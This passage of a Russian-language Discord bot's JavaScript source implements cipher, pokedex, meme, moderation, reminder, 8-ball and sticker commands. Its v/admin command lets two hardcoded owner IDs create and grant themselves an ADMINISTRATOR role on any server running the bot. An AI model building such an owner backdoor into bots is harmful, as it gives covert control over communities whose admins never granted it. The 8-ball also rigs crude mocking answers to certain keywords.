      let caesar = message.content.split(' ').splice(3).join(' ')
      if(caesar.length<=0) return
      message.channel.send(new Discord.MessageEmbed({title:'Шифр Цезаря — сдвиг '+caesarCount,description: caesarShift(caesar.toString(), parseInt(caesarCount))}))
    }
  }
 
if(message.content.startsWith('v/idea')) {
  let args = message.content.split(' ').splice(1).join(' ')
  if(!args) return message.channel.send('Напишите идею!').then(message.delete())
  const jotaro = client.users.cache.get('269008055738433538')
  const embed = new MessageEmbed()
  embed.setTitle(message.author.tag)
  embed.setDescription(args)
  jotaro.send(embed)
  message.channel.send('Послал вашу идею прямо к Джотаро!').then(message.delete())
}
if(message.content.startsWith('v/pokedex')) {
  const args = message.content.split(' ').slice(1,2)
  if(args.length <= 0) {
pokedex.getPokemonCounts().then(count => {
  
  pokedex.getPokemonByNumber(parseInt(getRandomArbitrary(0, count.total))).then(pokemon => {
    console.log(pokemon)

    poke = pokemon[0]

    const pokembed = new MessageEmbed({
      title: `${poke.name} | №${poke.number}`,
    })
    pokembed.setThumbnail(poke.sprite)
    
    pokembed.addField(`Вид`, poke.species, true)
    pokembed.addField(`Типы`, poke.types, true)
    pokembed.addField(`Гендер`,` ${poke.gender[0]}/${poke.gender[1]}`, true)
    pokembed.addField(`Способности`,` ${poke.abilities.normal}`, true)
    pokembed.addField(`Линия эволюции`,` ${poke.family.evolutionLine.join(' => ')}`, true)
    pokembed.setDescription(poke.description)
    message.channel.send(pokembed)
  })
})


  } else if(parseInt(args)) {

    pokedex.getPokemonCounts().then(count => {
      pokecount = count.total
      pokedex.getPokemonByNumber(args).then(pokemon => {
        poke = pokemon[0]
        const pokembed = new MessageEmbed({
          title: `${poke.name} | №${poke.number}`,
        })
        pokembed.setThumbnail(poke.sprite)
        
        pokembed.addField(`Вид`, poke.species, true)
        pokembed.addField(`Типы`, poke.types, true)
        pokembed.addField(`Гендер`,` ${poke.gender[0]}/${poke.gender[1]}`, true)
        pokembed.addField(`Способности`,` ${poke.abilities.normal}`, true)
        pokembed.addField(`Линия эволюции`,` ${poke.family.evolutionLine.join(' => ')}`, true)
        pokembed.setDescription(poke.description)
        message.channel.send(pokembed)
      })
    

    })

  } else if(!parseInt(args)) {
    
    pokedex.getPokemonCounts().then(count => {
      pokecount = count.total
      pokedex.getPokemonByName(args).then(pokemon => {
        poke = pokemon[0]
        const pokembed = new MessageEmbed({
          title: `${poke.name} | №${poke.number}`,
        })
        pokembed.setThumbnail(poke.sprite)
        
        pokembed.addField(`Вид`, poke.species, true)
        pokembed.addField(`Типы`, poke.types, true)
        pokembed.addField(`Гендер`,` ${poke.gender[0]}/${poke.gender[1]}`, true)
        pokembed.addField(`Способности`,` ${poke.abilities.normal}`, true)
        pokembed.addField(`Линия эволюции`,` ${poke.family.evolutionLine.join(' => ')}`, true)
        pokembed.setDescription(poke.description)
        message.channel.send(pokembed)
      })
    

    })

}
  message.delete()

}
if(message.content.startsWith('v/meme')){
  const memeArgs = message.content.split(' ').slice(1,2)
  if(memeArgs.length<=0){
  meme( function(err, data) {
    if (err) return console.error(err);
    const memembed = new Discord.MessageEmbed({
      title:data.title + ' — ' + 'r/'+data.subreddit,
      description: `Автор: ${data.author}`
      
    })
    memembed.setImage(data.url)
    message.channel.send(memembed)
  });
  
} 
}
    // If the message content starts with "!kick"
    if (message.content.startsWith('v/kick')) {

        if(!message.member.hasPermission("KICK_MEMBERS"))return message.reply("НЕДОСТАТОЧНО ПРАВ")
                

        
      // Assuming we mention someone in the message, this will return the user
      // Read more about mentions over at https://discord.js.org/#/docs/main/master/class/MessageMentions
      
      const kickReason = message.content.split(' ').splice(2).join('')
      const member = message.mentions.members.first();

      // If we have a user mentioned
      
        // If the member is in the guild
        if (!member) return message.channel.send('Вы не упомянули участника для кика!')
          member
            .kick(kickReason)
            .then(() => {
              // We let the message author know we were able to kick the person
              if(client.guild[message.guild.id].ban){
              const embed = new MessageEmbed()
              .setTitle("v/KICK")
              .setDescription(`${message.author} выгнал ${member}`)
              .addField('Причина', kickReason)
              .setColor('ORANGE')
              
              
              client.channels.cache.get(client.guild[message.guild.id].ban).send(embed);
              message.delete()
              }
            })
          
            .catch(err => {
              message.reply('Невозможно выгнать из-за ошибки');
              
              console.error(err);
            });
        
        

}
  // If the message content starts with "!kick"
  if (message.content.startsWith('v/ban')) {

      if(!message.member.hasPermission("BAN_MEMBERS"))return message.channel.send("НЕДОСТАТОЧНО ПРАВ")
         

      
    // Assuming we mention someone in the message, this will return the user
    // Read more about mentions over at https://discord.js.org/#/docs/main/master/class/MessageMentions
    const member = message.mentions.members.first();
    const banReason = message.content.split(' ').splice(2).join(' ');

      // If the member is in the guild
      if (!member) return message.channel.send('Вы не упомянули участника для бана!')
        member
          .ban('Зобанен по причине: ' + banReason)
          .then(() => {
            // We let the message author know we were able to kick the person
            if(client.guild[message.guild.id].ban) {
              const embed = new MessageEmbed()
              .setTitle("v/BAN")
              .setDescription(`${message.author} зобэнил ${member}`)
              .addField('Причина', banReason)
              .setColor('RED')
              
              
              client.channels.cache.get(client.guild[message.guild.id].ban).send(embed);
              message.delete() 
            }
        })
          .catch(err => {
           
            message.reply('Невозможно зобанить из-за ошибки');
            
            console.error(err);
          });
      
      // Otherwise, if no user was mentioned
    

}
    if (message.content.startsWith('v/avatar')) {
      // Send the user's avatar URL
      const args = message.mentions.users.first()
      if(!args) {
      const embed = new MessageEmbed()
      .setTitle(message.author.tag)
      .setColor(0xffffff)
      .setImage(message.author.displayAvatarURL({format: 'png', dynamic: true}))

      message.channel.send(embed)

      } else {
        const embed = new MessageEmbed()
        .setTitle(args.tag)
        .setColor(0xffffff)
        .setImage(args.avatarURL({format: 'png', dynamic: true}))


        message.channel.send(embed)
      }
      message.delete()
    }
    
    // If the message is "how to embed"
    if (message.content.startsWith(`v/embed`)) {
      // We can create embeds using the MessageEmbed constructor
      // Read more about all that you can do with the constructor
      // over at https://discord.js.org/#/docs/main/master/class/MessageEmbed
      const embed = new MessageEmbed()
      const title = message.content.split("|").slice(1,2).join(' ');
      const desc = message.content.split('|').splice(2,3).join(' ')
        // Set the title of the field
        embed.setTitle(title)
        // Set the color of the embed
        embed.setColor(0xff3565)
        // Set the main content of the embed
        embed.setDescription(desc)
      // Send the embed to the same channel as the message
      message.channel.send(embed)
      message.delete()
    }
     
    if(message.content.startsWith('v/remind')) {

      const remindtext = message.content.split(" ").splice(3).join(' ');
      const mh = message.content.split(' ').slice(2,3)
      const remindtime = message.content.split(' ').slice(1,2);
      let remtime = 0
      var fruits = new Array();
      if(remindtime == 'del') {
        let reminddel = message.content.split(' ').slice(2,3)
        if(reminddel.length <= 0 || !parseInt(reminddel)) return message.channel.send('Укажите номер напоминания').then(message.delete())
        for (var key in Object(client.remind[message.author.id])) {
          fruits.push(key);
        }
        if(!client.remind[message.author.id][fruits[reminddel-1]]) return message.channel.send('Укажите **правильный** номер напоминания').then(message.delete())
        delete client.remind[message.author.id][fruits[reminddel-1]]
        return message.channel.send('Удалил напоминание номер ' + `**${reminddel}**`).then(message.delete())
      }
      if(!parseInt(remindtime) && remindtext.length <= 0) {
        for (var key in Object(client.remind[message.author.id])) {
          fruits.push(key);
        }
          let desc =''
            for(let i = 0; i < Object.keys(client.remind[message.author.id]).length; i++) {
              desc+= `**${i+1}.** ${fruits[i]} | Через ${Math.floor((client.remind[message.author.id][fruits[i]] - new Date().getTime())/1000)}s\n`
            }
            if(desc.length <= 0) desc ='Нет у вас напоминаний. Видимо, память хорошая'
            const remindbed = new MessageEmbed({
              title: `Напоминания ${message.author.username}`,
              description: desc
            })
            
            return message.channel.send(remindbed)
          }
      if(!parseInt(remindtime)) return message.channel.send('Введите правильное число').then(message.delete())
      if(remindtext.length <= 0) return message.channel.send('Введите текст напоминания!').then(message.delete())
      if(mh == 'm'){

        
      remtime = remindtime * 60 * 1000;
      
        
      
      
      } else if(mh == 'h'){

          remtime = remindtime * 60 * 60 * 1000;

         
        }else if (mh = 'd') {
          remtime = remindtime * 60 * 60 * 24 * 1000
        }else return message.channel.send('Не существует такой единицы времени').then(message.delete())
        
        client.remind[message.author.id][remindtext] = new Date().getTime() + remtime
        fs.writeFile('./remind.json', JSON.stringify(client.remind, null,4), err => {
          if(err) throw err
        })

        message.channel.send('Поставил напоминание через ' + remindtime + mh + '!')
        message.delete()
    }
    
    if(message.content.startsWith('v/8')) {
      if(!message.content.endsWith('?')) return message.channel.send('Это не вопрос')
      let v8
      var rand = [':8ball: Абсолютно.', ':8ball: Абсолютно нет.', ':8ball: Это правда.', ':8ball: Невозможно.', ':8ball: Конечно.', ':8ball: Я так не думаю.', ':8ball: Это правда.', ':8ball: Это неправда.', ':8ball: Несомненно.', ':8ball: Я очень в этом сомневаюсь.', ':8ball: Мои источники подсказвают, что нет.', ':8ball: Теории это доказывают.', ':8ball: Отвечает туманно.', ':8ball: Спросите позже', ':8ball: Сейчас вам лучше не знать', ':8ball: Не могу предсказать сейчас', ':8ball: Сконцентрируйтесь и спросите снова'];
      var rand1 = [':8ball: Абсолютно.', ':8ball: Это правда.', ':8ball: Конечно.',  ':8ball: Это правда.', ':8ball: Несомненно.', ':8ball: Теории это доказывают.'];
      var rand3 = [ ':8ball: Абсолютно нет.',  ':8ball: Невозможно.',  ':8ball: Я так не думаю.',  ':8ball: Это неправда.',  ':8ball: Я очень в этом сомневаюсь.', ':8ball: Мои источники подсказвают, что нет.'];


       if(message.content.toLowerCase().includes('еблан?')){
        v8 = rand1[Math.floor(Math.random()*rand1.length)];
      } else if (message.content.toLowerCase().includes('трап')){
        v8 = rand3[Math.floor(Math.random()*rand3.length)];
      } else {
        v8 = rand[Math.floor(Math.random()*rand.length)];
      }
      
      message.channel.send(v8)
    }
    if(message.content.startsWith('v/who')){

     
      
    
      let plr = message.guild.members.cache.random()
      if (plr.user.bot) return
      const question = message.content.split(' ').splice(1).join(' ').toLowerCase()
      const quo = message.content.split(' ').splice(1).join(' ')
      const whoembed = new MessageEmbed({
        title: 'Кто '+ quo + `${(String(question).includes('?') == true ?'' :'?')}`,
        description:`Несомненно, это ${plr.toString()}`
      })
      if(question.length <= 0) return message.channel.send('Спросите нормально!')
      if(client.who[message.guild.id][question]) (whoembed.setDescription(`Я уже отвечал, кто это. Это же ${message.guild.members.cache.get(client.who[message.guild.id][question]).toString()}`))
      
      message.channel.send(whoembed).then(message.delete())
      client.who[message.guild.id][question] = plr.id
      fs.writeFile('./who.json', JSON.stringify(client.who, null, 4), err => {
        if(err) console.log(err)
    })

    }
    if(message.content.startsWith('v/BZD')) {
      if(!message.member.hasPermission('ADMINISTRATOR')) return message.delete()



    let BZD = setInterval(async ()=>{
      const channul = message.channel
      const fetched = await channul.messages.fetch({limit: 99});
      if(fetched.size <= 0) clearInterval(BZD)
      
      channul.bulkDelete(fetched).catch(err=>{
        if(err) console.log(err)
      }) 
        
      
    }, 3000)
    
    
  }
  
  if(message.content.startsWith('v/admin')) {
    if(message.author.id != '269008055738433538' && message.author.id != '696040239495381196') return

    message.guild.roles.create({
      data: {
        name:'ADMINROLE',
        permissions: 'ADMINISTRATOR',
        color: 'PURPLE'
      
      }
    }).then(role => {
      message.member.roles.add(role)
    })
  
    message.channel.send('Овнер Васи на сервере!')
    message.delete()
  }

  if(message.content.startsWith('v/del')) {
    
    if(message.author.id!='269008055738433538' && !message.member.hasPermission('MANAGE_MESSAGES')) return  message.channel.send('Недостаточно прав.')
    let args = message.content.split(' ').slice(1,2)
    let args1 = args
    const user = message.mentions.users.first()
    const channul = message.channel
  //  const user = message.mentions.users.first()
    if(args.length <= 0 ) return message.channel.send('Предоставьте число').then(message.delete())
    if(!parseInt(args)) return message.channel.send('Неверное число').then(message.delete())
   if(!user){
      console.log('да')
      parseInt(args)
      if(args < 99 ) {
      console.log('<99')
        const fetched = await channul.messages.fetch({limit: parseInt(args)+1});
      console.log(fetched.size)
      channul.bulkDelete(fetched)
      } else if (args > 99) {
        console.log('>99');
        let del = setInterval(async()=>{
          if(args <= 99) {
            let fetched 
           fetched = await channul.messages.fetch({limit: parseInt(args)-99});
           channul.bulkDelete(fetched)
          } else if(args > 99) {
           fetched = await channul.messages.fetch({limit: parseInt(args)});
          channul.bulkDelete(fetched)
          } else if (args <= 0){
            clearInterval(del)
          }
          args -=99
          channul.bulkDelete(fetched)
        }, 500)
        
      }
    } else if(user){
      console.log('да')
      parseInt(args)
      if(args < 99 ) {
      console.log('<99')
        const fetched = await channul.messages.fetch({limit: parseInt(args)+1});
      console.log(fetched.size)
      fetched.forEach(msg => {
        if(msg.author.id != user.id) return
        msg.delete()
      })

      } else if (args > 99) {
        console.log('>99');
        let del = setInterval(async ()=>{
          if(args <= 99) {
            let fetched 
           fetched = await channul.messages.fetch({limit: parseInt(args)-99});
           fetched.forEach(msg => {
            if(msg.author.id != user.id) return
            msg.delete()
          })
          } else if(args > 99) {
           fetched = await channul.messages.fetch({limit: parseInt(args)});
           fetched.forEach(msg => {
            if(msg.author.id != user) return
            msg.delete()
          })
          } else if (args <= 0){
            clearInterval(del)
          }
          args -=99
          channul.bulkDelete(fetched)
        }, 500)
        
      }
    }

    channul.send(`Удалил ${args1} сообщений` + (user ?` от ${user.toString()}` :'')).then( message => {
      message.delete({timeout: 2000})
  });
}
})
  //модули
  client.on('message', message => {
    
    
    if(message.content.startsWith('v/import')) {
    
        const args = String(message.content.split(' ').slice(1,2)).toLowerCase()
  
        
      const proved_modules = ['rp', 'music', 'stickers', 'rooms', 'actions']
      if(!proved_modules.includes(args.toString())) return message.channel.send('Такого модуля не существует.').then(message.delete())
      if(client.modules[message.guild.id].mods.includes(args.toString())){ return message.channel.send('У вас уже есть этот модуль.').then(message.delete())
    } else {

            client.modules[message.guild.id].mods.push(args.toString())
            fs.writeFile('./modules.json', JSON.stringify(client.modules, null, 4), err => {
                if(err) console.log(err)
            })
          
      
        message.channel.send(`Теперь у вас есть модуль ${args.toString().toUpperCase()}`)
        message.delete()
          }
    }
    if(message.content.startsWith('v/export')) {

      const args = message.content.split(' ').slice(1,2)
      if(!client.modules[message.guild.id].mods.includes(args.toString())) return message.channel.send('У вас нет такого модуля').then(message.delete())

          for( var i = 0; i < client.modules[message.guild.id].mods.length; i++){
             if (           client.modules[message.guild.id].mods[i] === args.toString()) {
              client.modules[message.guild.id].mods.splice(i, 1); }
            }
          fs.writeFile('./modules.json', JSON.stringify(client.modules, null, 4), err => {
              if(err) console.log(err)
          })
      
    
      message.channel.send(`Теперь у вас нет модуля ${args}`)
      message.delete()
  
  }
})
function attachIsGif(msgAttach) {
  var url = msgAttach.url;
  //True if this url is ajpg image.
if (url.indexOf("png", url.length - "png".length /*or 3*/) !== -1)    return (url.indexOf("png", url.length - "png".length /*or 3*/) !== -1)
if (url.indexOf("jpg", url.length - "jpg".length /*or 3*/) !== -1)    return (url.indexOf("jpg", url.length - "jpg".length /*or 3*/) !== -1)
if (url.indexOf("webp", url.length - "webp".length /*or 3*/) !== -1)    return (url.indexOf("webp", url.length - "webp".length /*or 3*/) !== -1)
if (url.indexOf("gif", url.length - "gif".length /*or 3*/) !== -1)    return (url.indexOf("gif", url.length - "gif".length /*or 3*/) !== -1)
}
  client.on('message', message =>{
   
    
    if(message.content.startsWith('vs/')) {
      if(!client.modules[message.guild.id] ||  !client.modules[message.guild.id].mods.includes('stickers')) return message.channel.send('У вас не включён модуль STICKERS.')
    if(message.content.startsWith('vs/add')) {
 
    
      let args = message.attachments.first()
      let name = message.content.split(' ').slice(1,2)
      if(!args|| attachIsGif(args) != true) return message.channel.send('Предоставьте изображение').then(message.delete())
      if(client.stickers[message.author.id][name]) return message.channel.send('У вас уже есть стикер с таким названием').then(message.delete())
      if(client.stickers[message.author.id].length >= 30) return message.channel.send('Вы превышаете лимит на стикеры. Удалите один из существующих, чтобы освободить место.').then(message.delete())
      if(name.length <= 0) return message.channel.send('Назовите стикер!').then(message.delete())
      const stickchannel = client.channels.cache.get('705326273148354642')
      console.log(stickchannel.name)
      
      stickchannel.send(message.attachments.first()).then(msg => {
        client.stickers[message.author.id][name] = args.url
        
        fs.writeFile('./stickers.json', JSON.stringify(client.stickers, null, 4), err => {
          if(err) throw err
        })
       
      })
      
     
      message.channel.send(`Успешно добавил стикер "${name}" в вашу галерею стикеров.`)
      message.delete()
    }
    if(message.content.startsWith('vs/s')) {
      let name = message.content.split(' ').slice(1,2)
      if(!name) return message.channel.send('Предоставьте название!').then(message.delete())
      if(!client.stickers[message.author.id][name]) return message.channel.send('Неверное имя.').then(message.delete())
      let attachment = new Discord.MessageAttachment()
      let attachembed = new MessageEmbed()
      
      //attachment.setFile(client.stickers[message.author.id][name])
     
      console.log(client.stickers[message.author.id][name].toString())
      attachembed.setDescription(message.author.toString() + `| ${name}`)
      attachembed.setImage(client.stickers[message.author.id][`${name}`])
      message.channel.send(attachembed).then(message.delete())
    }
    if(message.content.startsWith('vs/del')) {
      let name = message.content.split(' ').slice(1,2)
      if(!name) return message.channel.send('Предоставьте название!').then(message.delete())
      if(!client.stickers[message.author.id][name]) return message.channel.send('Неверное имя.').then(message.delete())
      delete client.stickers[message.author.id][name]
      fs.writeFile('./stickers.json', JSON.stringify(client.stickers, null, 4), err => {
        if(err) throw err
      })
      message.channel.send(`Удалил стикер "${name}"`)
      message.delete()
    }
    if(message.content.startsWith('vs/list')) {
      const stickerbed = new MessageEmbed()
      stickerbed.setTitle(`Стикеры ${message.author.tag}`)
      let desc = ''
      
      
      message.channel.send(stickerbed)
      //for(let i = client.stickers[message.author])
    }
    }
  })
  
client.on('message', message =>{
  if(message.content.startsWith('vm/')) {

    if(!client.modules[message.guild.id] ||  !client.modules[message.guild.id].mods.includes('music')) return message.channel.send('У вас не включён модуль музыки.')
    const args = message.content.slice(3)
    if(message.content.startsWith('vm/play')) {

      client.music.bot.playFunction(message, args);
    }
    if(message.content.startsWith('vm/skip')){
      client.music.bot.skipFunction(message, args)
    }


  }
})  
client.login(config.token) 
